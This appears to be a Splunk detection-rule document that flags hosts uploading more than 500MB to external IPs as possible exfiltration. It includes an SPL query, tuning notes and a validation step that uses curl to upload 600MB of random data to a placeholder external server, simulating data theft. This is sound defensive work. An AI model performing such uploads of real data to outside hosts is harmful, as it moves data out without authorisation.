# Large Data Upload to External IP (>500MB)

## 📝 Metadata
| Attribute | Value |
| :--- | :--- |
| **ID** | `SPL-DATA-001` |
| **MITRE Tactic** | Exfiltration |
| **MITRE Technique** | [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/) |
| **Severity** | MEDIUM |
| **Status** | Production |
| **Author** | PrototypePrime |

## ⚠️ Description
Identifies internal hosts uploading large amounts of data (>500MB) to external IP addresses. This rule enriches the destination IP with DNS data to provide context.

**Attack Scenario:**
1.  Attacker collects sensitive data on a compromised host.
2.  Attacker exfiltrates data to an external C2 server or storage bucket.
3.  Large outbound traffic volume is observed (e.g., database dump).

---

## 🔍 SPL Query
```spl
index=firewall action=allowed
# --- Tuning: Filter whitelisted destinations ---
# | search NOT [| inputlookup Whitelist.CSV | fields IP | rename IP as dest] 

# --- A. Threshold (500MB) ---
| eventstats sum(bytes_out) as send by src, dest, dest_port
| where send > 524288000

# --- B. Enrichment (Context) ---
| lookup dnslookup clientip as dest OUTPUT clienthost as dest_host1
| eval dest_host = coalesce(dest_host1, dest_hostname, "unknown")

# --- C. Formatting ---
| stats 
    values(send) as total_bytes
    values(category) as dest_category 
    values(url) as URL 
    values(dest_host) as dest_host 
    values(host) as firewall_device
    count 
    by src, dest, dest_port
| fillnull value="NULL"
| eval send_mb = round(total_bytes/1024/1024, 1)
| sort - send_mb

| table send_mb, src, dest, dest_port, dest_host, dest_category, URL, firewall_device
```

---

## 📦 Data Schema
*   **Index:** `firewall` (or `network`)
*   **Sourcetype:** `firewall`
*   **Key Fields:** `bytes_out`, `src`, `dest`, `dest_port`

## 🧪 Validation & Tuning
**False Positives:**
*   Video conferencing traffic (Zoom, Teams).
*   Backup jobs to cloud storage.
*   Legitimate large file transfers (ISO downloads/uploads).

**Tuning:**
*   Add safe IPs to `Whitelist.CSV`.
*   Filter by `dest_category` if available (e.g., exclude "Collaboration").

**Validation Steps:**
1.  **Simulation:** Upload a large file (e.g., 600MB random data) to an external server (e.g., AWS S3).
    ```bash
    dd if=/dev/urandom of=largefile.test bs=1M count=600
    curl -T largefile.test http://external-server/upload
    ```
2.  **Verify:** Confirm the SPL returns the source IP, destination, and correct MB count.

## ⏭️ Response
1.  Identify the user and process responsible for the transfer.
2.  Check the destination reputation (VirusTotal, Talos).
3.  Verify if the transfer aligns with a change request or business need.
